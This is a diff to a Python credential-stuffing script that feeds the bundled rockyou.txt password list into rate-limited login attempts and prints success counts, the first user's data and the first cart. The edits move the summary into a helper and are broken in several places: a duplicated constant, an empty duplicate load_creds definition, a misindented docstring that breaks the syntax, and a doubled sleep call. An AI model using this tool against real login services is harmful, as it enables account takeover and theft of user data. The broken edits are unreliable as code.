@@ -9,6 +9,11 @@ from typing import Optional, Union
 # Location of the bundled password list used for credential stuffing attacks.
 # This uses ``__file__`` so the script works no matter the working directory.
 ROCKYOU_PATH = Path(__file__).with_name("data").joinpath("rockyou.txt")
+REQUEST_TIMEOUT = 3
+
+
+def load_creds(path: Union[Path, str] = ROCKYOU_PATH, limit: Optional[int] = None):
+
 
 REQUEST_TIMEOUT = 3
 
@@ -16,7 +21,8 @@ REQUEST_TIMEOUT = 3
 def load_creds(
     path: Union[Path, str, None] = ROCKYOU_PATH, limit: Optional[int] = None
 ):
-    """Load credentials from a file with an optional limit.
+
+  """Load credentials from a file with an optional limit.
 
     *path* may be a :class:`pathlib.Path` or string. By default the bundled
     ``rockyou.txt`` file located in the ``data`` directory alongside this
@@ -80,6 +86,19 @@ def attack(
                     chain = resp.json().get("chain")
             except Exception as exc:
                 print("CHAIN ERROR:", exc)
+
+    def print_summary():
+        total_time = time.time() - start
+        print(f"Attempts: {attempted}, successes: {success}, blocked: {blocked}")
+        if first_success_attempt:
+            print(
+                f"First success after {first_success_attempt} attempts ({first_success_time:.2f}s)"
+            )
+        print(f"Total elapsed time: {total_time:.2f}s")
+        if first_user_info:
+            print(f"First user data: {first_user_info}")
+        if first_cart:
+            print(f"First cart: {first_cart}")
 
     try:
         for i in range(1, attempts + 1):
@@ -174,21 +193,15 @@ def attack(
                     first_success_attempt = i
                     first_success_time = time.time() - start
 
+                time.sleep(1 / rate_per_sec)
+
             time.sleep(1 / rate_per_sec)
     except KeyboardInterrupt:
         print("Interrupted by user, printing summary...")
+        print_summary()
+        return
 
-    total_time = time.time() - start
-    print(f"Attempts: {attempted}, successes: {success}, blocked: {blocked}")
-    if first_success_attempt:
-        print(
-            f"First success after {first_success_attempt} attempts ({first_success_time:.2f}s)"
-        )
-    print(f"Total elapsed time: {total_time:.2f}s")
-    if first_user_info:
-        print(f"First user data: {first_user_info}")
-    if first_cart:
-        print(f"First cart: {first_cart}")
+    print_summary()
 
 
 if __name__ == "__main__":
